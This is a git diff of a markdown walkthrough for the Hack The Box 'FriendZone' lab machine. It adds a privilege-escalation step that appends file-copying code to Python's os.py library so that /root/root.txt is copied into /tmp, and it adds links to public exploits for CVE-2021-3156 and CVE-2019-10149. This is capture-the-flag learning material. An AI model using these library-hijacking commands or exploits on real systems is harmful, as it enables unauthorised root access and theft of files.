@@ -505,7 +505,14 @@ cd /tmp
 echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 ```
 
-## One More Alternative Root Privilege Escalation
++ If not run, try this **alternatively**:
+```
+echo "infile = open(\"/root/root.txt\", \"r\").read()" > /usr/lib/python2.7/os.py
+echo "outfile = open(\"/tmp/root.txt\", \"w\").write(infile)" >> /usr/lib/python2.7/os.py
+echo "outfile.close()" >> /usr/lib/python2.7/os.py
+```
+
+## Root Privilege Escalation: Alternative 1
 + Check smtp port on the target's localhost: `netstat -ant | grep 25`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/99dcb078-442a-463b-a8b6-09b57ec37f26)
@@ -513,15 +520,22 @@ echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 + For more, you can try [CVE-2019-10149]: https://github.com/Diefunction/CVE-2019-10149, and [an alternative different approach](https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/).
 
 
+## Root Privilege Escalation: Alternative 2
++ Check [CVE-2021-3156](https://www.exploit-db.com/exploits/49522) Sudo Baron Samedit vulnerability, and try to exploit using https://github.com/blasty/CVE-2021-3156.
++ For more, check https://hackmd.io/@Mecanico/Syu8fKUAc#⏫Root-Privesc.
+
+
 # References & Alternatives
 + https://vvmlist.github.io/#FriendZone
 + https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/friendzone-writeup-w-o-metasploit
-+ https://ethicalhacs.com/friendzone-hackthebox-walkthrough/
 + https://0xrick.github.io/hack-the-box/friendzone/
++ https://ethicalhacs.com/friendzone-hackthebox-walkthrough/
 + https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
++ https://github.com/jebidiah-anthony/htb_friendzone
 + https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/friendzoned
 + https://rootissh.in/hackthebox-friendzone-walkthrough-htb-e438711443f7
++ https://hackmd.io/@Mecanico/Syu8fKUAc
 
 
 # Technical Knowledge
@@ -529,8 +543,12 @@ echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 + https://www.tutorialspoint.com/What-are-pyc-files-in-Python
 + https://ethicalhacs.com/admirer-hackthebox-walkthrough/
 + https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
++ https://github.com/jebidiah-anthony/htb_friendzone
 
 
 # CVE Scripting
 + [CVE-2019-10149]: https://github.com/Diefunction/CVE-2019-10149
 + https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/
++ **CVE-2021-3156**: https://github.com/blasty/CVE-2021-3156
++ https://www.exploit-db.com/exploits/49522
++ https://hackmd.io/@Mecanico/Syu8fKUAc#⏫Root-Privesc
